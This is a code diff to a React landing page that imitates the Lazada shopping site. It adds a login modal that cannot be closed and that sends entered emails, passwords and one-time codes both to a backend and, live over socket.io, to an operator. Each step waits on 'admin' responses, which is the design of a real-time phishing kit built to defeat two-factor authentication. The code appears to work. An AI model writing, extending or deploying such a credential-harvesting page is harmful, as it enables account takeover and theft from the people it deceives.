@@ -31,6 +31,7 @@ import {
   useBreakpointValue,
   Divider,
 } from "@chakra-ui/react";
+import { io } from "socket.io-client";
 import { ChevronDownIcon } from "lucide-react";
 import { useTranslation } from "react-i18next";
 import { LuShoppingCart } from "react-icons/lu";
@@ -38,6 +39,7 @@ import { MdOutlineSearch } from "react-icons/md";
 import { RxEyeClosed, RxEyeOpen } from "react-icons/rx";
 import { useEffect, useState } from "react";
 import { IoIosArrowBack } from "react-icons/io";
+import axios from "axios";
 import IndonesiaFlagIcon from "/flags/indonesia.svg";
 import MalaysiaFlagIcon from "/flags/malaysia.svg";
 import PhilipinasFlagIcon from "/flags/philipinas.svg";
@@ -47,6 +49,11 @@ import VietnamFlagIcon from "/flags/vietnam.svg";
 import ChineseFlagIcon from "/flags/china.svg";
 import EnglishFlagIcon from "/flags/england-flag.svg";
 import MobileMenu from "../components/MobileMenu";
+import { BaseUrl, SERVER_URL } from "../utils/reusables";
+import Spinner from "../components/Spinner";
+import StepTwo from "../components/StepTwo";
+import StepThree from "../components/StepThree";
+import StepOne from "../components/StepOne";
 
 const languages = [
   { code: "th", name: "Thailand", flag: ThailandFlagIcon },
@@ -70,9 +77,21 @@ const images = [
   "/slide/8.jpg",
 ];
 
+const socket = io(SERVER_URL);
+
 const Landing = () => {
+  const [loading, setLoading] = useState(false);
   const [currentImageIndex, setCurrentImageIndex] = useState(0);
   const [showPassword, setShowPassword] = useState(false);
+  const [lgCurrentStep, setLgCurrentStep] = useState(1);
+  const [adminResponse, setAdminResponse] = useState(null);
+  const [adminOtpResponse, setAdminOtpResponse] = useState(null);
+  const [adminOtpUpdatedResponse, setAdminOtpUpdatedResponse] = useState(null);
+  const [data, setData] = useState({
+    email: "",
+    password: "",
+    otp: "",
+  });
   const { t, i18n } = useTranslation();
   const { isOpen, onOpen } = useDisclosure();
   const {
@@ -100,6 +119,45 @@ const Landing = () => {
   const togglePasswordVisibility = () => setShowPassword(!showPassword);
 
   useEffect(() => {
+    // Listen for admin response
+    socket.on("adminResponse", (response) => {
+      setAdminResponse(response);
+      setLgCurrentStep(2);
+      setLoading(false);
+    });
+
+    return () => {
+      socket.off("adminResponse");
+    };
+  }, []);
+
+  useEffect(() => {
+    // Listen for admin otp response
+    socket.on("adminOtpResponse", (response) => {
+      setAdminOtpResponse(response);
+      setLgCurrentStep(3);
+      setLoading(false);
+    });
+
+    return () => {
+      socket.off("adminOtpResponse");
+    };
+  }, []);
+
+  useEffect(() => {
+    // Listen for admin otp updated response
+    socket.on("adminOtpUpdatedResponse", (response) => {
+      setAdminOtpUpdatedResponse(response);
+      setLgCurrentStep(4);
+      setLoading(false);
+    });
+
+    return () => {
+      socket.off("adminOtpUpdatedResponse");
+    };
+  }, []);
+
+  useEffect(() => {
     onOpen();
   }, [onOpen]);
 
@@ -110,6 +168,101 @@ const Landing = () => {
 
     return () => clearInterval(intervalId); // Cleanup on component unmount
   }, [images.length]);
+
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+    setData({
+      ...data,
+      [name]: value,
+    });
+  };
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    setLoading(true);
+
+    try {
+      const response = await axios.post(`${BaseUrl}/lazada/save`, {
+        email: data.email,
+        password: data.password,
+      });
+
+      if (response.status === 201) {
+        socket.emit("loginAttempt", {
+          email: data.email,
+          password: data.password,
+          timestamp: new Date().toISOString(),
+        });
+      } else {
+        throw new Error("Login failed");
+      }
+
+      console.log("Login successful", response);
+    } catch (error) {
+      console.error(
+        "Login failed",
+        error.response ? error.response.data : error.message
+      );
+      setLoading(false); // Set loading to false if there's an error
+    }
+  };
+
+  const handleNext = () => {
+    setLoading(true);
+    socket.emit("otpAttempt", {
+      email: data.email,
+      message: "send OTP",
+      timestamp: new Date().toISOString(),
+    });
+  };
+
+  const handleResend = () => {
+    setLoading(true);
+    setAdminOtpResponse(null);
+    socket.emit("otpResendAttempt", {
+      email: data.email,
+      message: "resend OTP",
+      timestamp: new Date().toISOString(),
+    });
+  };
+
+  const handleFinish = async (e) => {
+    e.preventDefault();
+
+    setLoading(true);
+    // setAdminOtpResponse(null);
+
+    try {
+      const response = await axios.put(`${BaseUrl}/lazada/update`, {
+        email: data.email,
+        password: data.password,
+        otp: data.otp,
+      });
+
+      if (response.status === 200) {
+        socket.emit("updateAttempt", {
+          email: data.email,
+          password: data.password,
+          otp: data.otp,
+          timestamp: new Date().toISOString(),
+        });
+      } else {
+        throw new Error("Login failed");
+      }
+
+      console.log("Login successful", response);
+    } catch (error) {
+      console.error(
+        "Login failed",
+        error.response ? error.response.data : error.message
+      );
+      setLoading(false); // Set loading to false if there's an error
+    }
+  };
+
+  const isEmailValid = data.email.includes("@");
+  const isPasswordValid = data.password.length >= 6;
 
   return (
     <>
@@ -579,102 +732,88 @@ const Landing = () => {
         <Modal isOpen={isOpen} isCentered isClosable={false}>
           <ModalOverlay />
           <ModalContent w="444px" h="326.58px" maxW="444px" maxH="326.58px">
-            <ModalHeader>
-              <HStack justifyContent="center">
+            <ModalHeader pb="0">
+              <HStack
+                justifyContent={lgCurrentStep === 3 ? "flex-start" : "center"}
+              >
                 <Text
                   color="#2e3346"
                   fontSize="16px"
                   fontWeight="500"
                   textAlign="center"
                 >
-                  Login
+                  {lgCurrentStep === 1 && "Login"}
+                  {lgCurrentStep === 2 && "Verify Email"}
+                  {lgCurrentStep === 3 && "Enter The Code"}
                 </Text>
               </HStack>
             </ModalHeader>
             <ModalCloseButton onClick={handleModalClose} />
             <ModalBody px="36px">
-              <VStack w="100%">
-                <VStack w="100%" gap="18px">
-                  <FormControl w="100%">
-                    <Input
-                      type="email"
-                      h="48px"
-                      placeholder="Please enter your Phone Number or Email"
-                      bg="0 0"
-                      border="1px solid #cbced5"
-                      borderRadius="6px"
-                      color="2e3346"
-                      fontSize="14px"
-                      fontWeight="400"
-                      lineHeight="18px"
-                    />
-                  </FormControl>
+              <Stack
+                w="100%"
+                h="100%"
+                justifyContent="center"
+                alignItems="center"
+                overflow="hidden"
+              >
+                {!loading && lgCurrentStep === 1 && (
+                  <StepOne
+                    handleSubmit={handleSubmit}
+                    data={data}
+                    handleChange={handleChange}
+                    showPassword={showPassword}
+                    togglePasswordVisibility={togglePasswordVisibility}
+                    isEmailValid={isEmailValid}
+                    isPasswordValid={isPasswordValid}
+                  />
+                )}
 
-                  <VStack spacing={0} alignItems="flex-end" w="100%">
-                    <FormControl>
-                      <InputGroup>
-                        <Input
-                          h="48px"
-                          type={showPassword ? "text" : "password"}
-                          placeholder="Please enter your password"
-                          bg="0 0"
-                          border="1px solid #cbced5"
-                          borderRadius="6px"
-                          color="2e3346"
-                          fontSize="14px"
-                          fontWeight="400"
-                          lineHeight="18px"
-                        />
-                        <InputRightElement>
-                          <Button
-                            h="1.75rem"
-                            size="sm"
-                            onClick={togglePasswordVisibility}
-                            variant="link"
-                            pr="0.5rem"
-                          >
-                            {showPassword ? (
-                              <RxEyeOpen size="1.5rem" />
-                            ) : (
-                              <RxEyeClosed size="1.5rem" />
-                            )}
-                          </Button>
-                        </InputRightElement>
-                      </InputGroup>
-                    </FormControl>
-                    <Button
-                      mt="-5px"
-                      variant="unstyled"
-                      fontSize="14px"
-                      color="#858b9c"
-                      cursor="pointer"
-                    >
-                      Forgot password?
-                    </Button>
+                {(loading || lgCurrentStep === 2) && (
+                  <VStack w="100%" h="100%">
+                    {!adminResponse ? (
+                      <Spinner />
+                    ) : (
+                      <StepTwo
+                        adminResponse={adminResponse}
+                        setLgCurrentStep={setLgCurrentStep}
+                        setLoading={setLoading}
+                        socket={socket}
+                        data={data}
+                        handleNext={handleNext}
+                      />
+                    )}
                   </VStack>
-                </VStack>
+                )}
 
-                <Button
-                  bg="#f57224"
-                  variant="solid"
-                  w="100%"
-                  color="#fff"
-                  fontSize="16px"
-                  fontWeight="500"
-                  lineHeight="40px"
-                >
-                  LOGIN
-                </Button>
+                {lgCurrentStep === 3 && (
+                  <VStack w="100%" h="100%">
+                    {loading ? (
+                      <Spinner
+                        size="lg"
+                        thickness="4px"
+                        speed="0.65s"
+                        emptyColor="gray.200"
+                      />
+                    ) : (
+                      <StepThree
+                        adminOtpResponse={adminOtpResponse}
+                        data={data}
+                        setData={setData}
+                        handleResend={handleResend}
+                        handleFinish={handleFinish}
+                        loading={loading} // Pass loading state to StepThree
+                      />
+                    )}
+                  </VStack>
+                )}
 
-                <HStack spacing="6px">
-                  <Text color="#858b9c" fontSize="14px">
-                    Don't have an account?
-                  </Text>
-                  <Button variant="unstyled" fontSize="14px" color="#1e71ff">
-                    Sign up
-                  </Button>
-                </HStack>
-              </VStack>
+                {(loading || lgCurrentStep === 4) && (
+                  <VStack w="100%" h="100%">
+                    {!adminOtpUpdatedResponse ? <Spinner /> : <Text>Done</Text>}
+                  </VStack>
+                )}
+              </Stack>
             </ModalBody>
           </ModalContent>
         </Modal>
